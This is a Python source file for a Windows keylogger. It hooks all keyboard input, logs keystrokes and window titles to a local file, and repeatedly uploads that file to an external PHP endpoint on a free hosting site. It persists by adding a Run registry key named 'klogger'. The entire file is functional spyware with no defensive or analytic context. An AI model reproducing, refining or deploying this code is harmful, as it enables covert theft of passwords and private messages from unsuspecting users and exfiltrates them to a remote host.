#!/usr/bin/python
#-*-coding:utf-8-*-

import pyHook
import pythoncom
import os
import subprocess
import requests
import threading
import time
import urllib,urllib2

data = ''
head = ''
dump = ''
def OnKey(event):
    global head
    global data
    global window
    global dump
    file = open('C:\\captura\\captura.txt', 'a')

    if event.WindowName != window:
        window = event.WindowName
        head = '\n' + window + ' - ' + str(event.Time) + '\n'
        file.write(head)
    if event.Ascii == 13:
        data = ('<ENTER>\n')
        file.write(data)
    elif event.Ascii == 8:
        data = (' <BACK SPACE> ')
        file.write(data)
    elif event.Ascii == 9:
        data = (' <TAB>')
        file.write(data)
    else:
        data = chr(event.Ascii)
        file.write(data)
        file.close()
    dump = head + data
    print ('tamanho de dump:', len(dump))
    if len(dump) > 100:
        upload(fileUp)
    return dump

def upload(fileUp):
	global urlFromUpload, urlFromUpShow
	if os.path.exists(fileUp):
		files = {'file': open(fileUp, 'rb')}
		r = requests.post(urlFromUpload, files=files) #import requests


def persis():
    try:
        conv = os.path.realpath(__file__).replace('.py', '.exe')
        subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "klogger" /t REG_SZ /F /D '+conv, shell=True)
    except Exception as e:
        print e
urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL that contains the php ARRAY to receive files via upload
urlFromUpShow = urlFromUpload.strip('http:upload.php')
window = None
persis()
fileUp = 'C:\\captura\\captura.txt'

try:
    os.mkdir('C:\\captura')
except:
    pass

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKey
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
